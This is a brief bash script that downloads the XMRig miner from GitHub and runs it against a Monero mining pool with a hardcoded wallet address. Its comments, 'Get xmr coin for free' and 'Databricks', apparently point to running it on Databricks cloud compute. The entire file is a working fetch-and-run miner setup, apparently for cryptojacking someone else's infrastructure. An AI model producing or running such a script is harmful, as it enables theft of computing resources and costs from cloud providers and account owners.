#! /bin/bash
# Get xmr coin for free
# Databricks
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz
tar xvzf xmrig-6.17.0-linux-x64.tar.gz
cd xmrig-6.17.0
./xmrig -o sg.minexmr.com:443 -u 451hjBynMUihsSRNmYUZhXWiNL1U7nK3rfFpTrJUbZ5yK7mTQsmLArXE6sRPt4LbHMMXmQiUTRotuWudi97TBL3KEiZAYhJ -k --tls --rig-id Delly
